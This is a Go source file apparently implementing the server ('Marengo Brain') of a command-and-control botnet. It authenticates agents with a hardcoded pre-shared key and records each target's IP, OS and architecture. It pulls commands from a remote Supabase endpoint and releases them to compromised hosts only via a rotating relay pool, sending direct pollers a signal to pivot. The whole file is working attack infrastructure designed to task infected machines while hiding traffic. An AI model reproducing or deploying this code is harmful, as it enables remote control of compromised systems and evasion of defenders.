package main

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// --- DATA STRUCTURES ---
type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

var (
	taskCache = make(map[string][]byte) // target_id -> raw task body
	cacheMu   sync.Mutex
)
var relayRotationIndex int

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

type TenantState struct {
	ActiveSessions map[string]string
	ActiveTargets  map[string]string
	LastSeen       map[string]time.Time
	TrafficCount   map[string]int
	PublicIPs      map[string]string
	NodeOS         map[string]string
	NodeArch       map[string]string
}

func newTenantState() *TenantState {
	return &TenantState{
		ActiveSessions: make(map[string]string),
		ActiveTargets:  make(map[string]string),
		LastSeen:       make(map[string]time.Time),
		TrafficCount:   make(map[string]int),
		PublicIPs:      make(map[string]string),
		NodeOS:         make(map[string]string),
		NodeArch:       make(map[string]string),
	}
}

var (
	relayPoolMap  = make(map[string]time.Time)
	relayMetadata = make(map[string]time.Time)
	tenants       = make(map[string]*TenantState)
	eventLog      []string
	mu            sync.Mutex
	startTime     = time.Now()
)

const (
	dbFile      = "infra_db.json"
	sessionFile = "sessions_db.json"
)

func getTenant(key string) *TenantState {
	t, ok := tenants[key]
	if !ok {
		t = newTenantState()
		tenants[key] = t
	}
	return t
}

func addLogInternal(msg string) {
	ts := time.Now().Format("15:04:05")
	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
	if len(eventLog) > 20 {
		eventLog = eventLog[:20]
	}
}

func saveState() {
	relays := make([]string, 0, len(relayPoolMap))
	for k := range relayPoolMap {
		relays = append(relays, k)
	}
	rData, _ := json.Marshal(relays)
	os.WriteFile(dbFile, rData, 0644)

	allSessions := make(map[string]map[string]string)
	for key, t := range tenants {
		allSessions[key] = t.ActiveSessions
	}
	sData, _ := json.Marshal(allSessions)
	os.WriteFile(sessionFile, sData, 0644)
}

func loadState() {
	mu.Lock()
	defer mu.Unlock()
	if rData, err := os.ReadFile(dbFile); err == nil {
		var keys []string
		json.Unmarshal(rData, &keys)
		for _, k := range keys {
			relayPoolMap[k] = time.Now()
			relayMetadata[k] = time.Now()
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	loadState()

	// Global reaper
	go func() {
		for {
			time.Sleep(10 * time.Second)
			mu.Lock()
			for _, t := range tenants {
				for id, ts := range t.LastSeen {
					if time.Since(ts) > 60*time.Second {
						delete(t.LastSeen, id)
						delete(t.ActiveTargets, id)
						delete(t.ActiveSessions, id)
					}
				}
			}
			for addr, ts := range relayPoolMap {
				if time.Since(ts) > 45*time.Second {
					delete(relayPoolMap, addr)
				}
			}
			mu.Unlock()
		}
	}()

	// REMOVED: go startAnalysisPanel()

	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("[!] Listen Error:", err)
		return
	}

	fmt.Println("[*] Marengo Brain Online: Port 8080")
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set a deadline to prevent hanging connections
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	fmt.Printf("[DEBUG] New connection attempt from: %s\n", conn.RemoteAddr())

	// 1. Read the PSK (Pre-Shared Key)
	// The agent sends 32 bytes of PSK before the JSON metadata.
	pskBuf := make([]byte, 32)
	n, err := conn.Read(pskBuf)
	if err != nil {
		fmt.Printf("[DEBUG] [%s] Error reading PSK: %v\n", conn.RemoteAddr(), err)
		return
	}

	receivedPSK := string(pskBuf[:n])
	expectedPSK := "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"

	if receivedPSK != expectedPSK {
		fmt.Printf("[DEBUG] [%s] Invalid PSK received: %s\n", conn.RemoteAddr(), receivedPSK)
		return
	}
	fmt.Printf("[DEBUG] [%s] PSK Verified successfully\n", conn.RemoteAddr())

	// 2. Decode the JSON Metadata
	// Note: Agent must send AuthRequest{Type, TargetID, APIKey}
	// where APIKey is tagged as `json:"key"` in the Brain's struct
	var req AuthRequest
	err = json.NewDecoder(conn).Decode(&req)
	if err != nil {
		fmt.Printf("[DEBUG] [%s] JSON Decode Error: %v (Check if Agent uses 'key' field)\n", conn.RemoteAddr(), err)
		return
	}

	id := req.TargetID
	key := req.Key

	fmt.Printf("[DEBUG] [%s] Parsed Request - Type: %s, ID: %s, Key: %s\n", conn.RemoteAddr(), req.Type, id, key)

	// 3. Handle specific request types
	mu.Lock()
	t := getTenant(key)
	if id != "" {
		t.TrafficCount[id]++
	}

	switch req.Type {
	case "client_poll":
		fmt.Printf("[*] POLL RECEIVED from ID: %s\n", id)
		t.LastSeen[id] = time.Now()
		remoteIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
		mu.Unlock() // Unlock global mu for network/cache work

		// 1. Check if request is from a known Relay
		mu.Lock()
		isFromRelay := false
		for addr := range relayPoolMap {
			if strings.HasPrefix(addr, remoteIP) {
				isFromRelay = true
				break
			}
		}

		// Prepare selectedRelay for the Signal (Direct poll only)
		var selectedRelay string
		activeRelays := []string{}
		for addr := range relayPoolMap {
			activeRelays = append(activeRelays, addr)
		}
		if len(activeRelays) > 0 {
			selectedRelay = activeRelays[relayRotationIndex%len(activeRelays)]
			relayRotationIndex++
		}
		mu.Unlock()

		var body []byte
		// 2. Task Retrieval Logic (Cache vs Supabase)
		cacheMu.Lock()
		if isFromRelay {
			if cachedBody, exists := taskCache[id]; exists {
				body = cachedBody
				delete(taskCache, id) // Clear cache after successful relay handover
				fmt.Printf("[!] CACHE HIT: Releasing payload to Relay for %s\n", id)
			}
		}
		cacheMu.Unlock()

		// If not from Relay OR cache was empty, fetch from Supabase
		if body == nil {
			fmt.Printf("[*] FETCHING FROM SUPABASE for ID: %s\n", id)
			supabaseURL := fmt.Sprintf("https://prodlnwtjkomsstrufqr.functions.supabase.co/task-poll?target_id=%s", id)
			hReq, _ := http.NewRequest("GET", supabaseURL, nil)
			hReq.Header.Set("x-api-key", key)

			resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(hReq)
			if err == nil {
				body, _ = io.ReadAll(resp.Body)
				resp.Body.Close()

				// If it's a direct poll and we found a task, CACHE IT for the relay
				if !isFromRelay {
					var taskCheck map[string]interface{}
					json.Unmarshal(body, &taskCheck)
					if taskCheck["command"] != nil && taskCheck["command"] != "" {
						cacheMu.Lock()
						taskCache[id] = body
						cacheMu.Unlock()
						fmt.Printf("[+] TASK CACHED for Relay handover: %s\n", id)
					}
				}
			}
		}

		// 3. Dispatch Logic
		var taskData map[string]interface{}
		json.Unmarshal(body, &taskData)

		if taskData["command"] != nil && taskData["command"] != "" {
			if isFromRelay {
				// RELAY TUNNEL: Send the real command
				fmt.Printf("[!] PAYLOAD RELEASE: Sending '%s' to %s via Relay\n", taskData["command"], id)
				json.NewEncoder(conn).Encode(taskData)
			} else {
				// DIRECT: Send signal to pivot
				fmt.Printf("[*] SIGNAL: Forcing %s to pivot to Relay %s\n", id, selectedRelay)
				json.NewEncoder(conn).Encode(map[string]string{
					"status":     "signal_task_available",
					"relay_addr": selectedRelay,
				})
			}
		} else {
			// Truly idle
			json.NewEncoder(conn).Encode(map[string]string{"status": "idle"})
		}
	case "middle":
		relayPoolMap[req.Listen] = time.Now()
		if _, exists := relayMetadata[req.Listen]; !exists {
			relayMetadata[req.Listen] = time.Now()
		}
		mu.Unlock()
		saveState()
		fmt.Printf("[+] RELAY UPDATED: %s\n", req.Listen)

	case "client_register":
		t.ActiveTargets[id] = key
		t.LastSeen[id] = time.Now()
		t.PublicIPs[id], _, _ = net.SplitHostPort(conn.RemoteAddr().String())
		addLogInternal("REGISTER: " + id + " [" + key[:8] + "...]")
		mu.Unlock()
		fmt.Printf("[+] AGENT REGISTERED: %s\n", id)

	default:
		mu.Unlock()
		fmt.Printf("[DEBUG] [%s] Unknown Request Type: %s\n", conn.RemoteAddr(), req.Type)
	}
}
